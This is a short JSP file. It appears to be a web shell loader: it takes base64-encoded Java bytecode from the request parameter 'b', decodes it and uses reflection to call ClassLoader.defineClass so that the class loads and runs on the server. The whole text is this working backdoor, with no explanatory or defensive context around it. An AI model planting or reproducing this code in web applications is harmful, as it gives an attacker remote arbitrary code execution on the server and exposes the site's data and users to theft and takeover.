<%
    ClassLoader loader = getClass().getClassLoader();
    byte[] bytes = new sun.misc.BASE64Decoder().decodeBuffer(request.getParameter("b"));
    java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod
            ("defineClass", String.class, byte[].class, int.class, int.class);
    method.setAccessible(true);
    out.print(method.invoke(loader, null, bytes, 0, bytes.length));
%>

